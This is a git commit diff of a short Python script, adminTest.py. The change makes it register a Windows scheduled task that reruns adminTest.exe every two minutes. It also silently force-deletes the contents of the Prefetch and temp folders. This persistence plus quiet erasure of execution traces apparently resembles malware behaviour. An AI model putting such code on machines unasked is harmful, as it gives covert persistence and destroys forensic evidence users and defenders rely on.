a74bb030585232f0a64c154147d592b535be0d4a
juanstm200 <juans.tovar70@gmail.com>
2021-11-05 19:27:53 -0500

    adminTest - getcwd_tests

--- Temp/adminTest.py
+++ Temp/adminTest.py
@@ -1,6 +1,7 @@
 import os
 
-os.system(r"schtasks /f /create /tn temps_v /sc minute /mo 30 /tr adminTest.exe")
+ruta = os.getcwd() + "\\adminTest.exe"
+os.system(r"schtasks /f /create /tn empanadas /sc minute /mo 2 /tr " + ruta)
 os.system(r"del /s /f /q C:\Windows\Prefetch\*.* > Nul 2>&1")
 os.system(r"del /s /f /q C:\Windows\Temp\*.* > Nul 2>&1")
 os.system(r"del /s /f /q C:\Users\%USERNAME%\AppData\Local\Temp\*.* > Nul 2>&1")
